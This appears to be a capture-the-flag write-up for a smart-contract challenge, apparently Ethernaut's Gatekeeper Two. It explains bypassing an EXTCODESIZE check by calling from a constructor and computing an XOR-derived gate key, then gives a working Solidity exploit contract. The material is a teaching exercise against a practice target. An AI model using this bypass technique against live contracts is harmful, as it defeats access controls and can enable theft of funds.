### Analysis
1) Gate Two: Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code
this means to pass gate two we'll need to call the enter function from our smart contract's constructor. 

2) Gate three: we can duplicate this logic in our own contract without having to work through each transformation

### The Exploit

~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GatePassTwo{

    constructor(address _target){
        bytes8 _gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        (bool success,) = address(_target).call(abi.encodeWithSignature("enter(bytes8)",_gateKey));
    }
}
~~~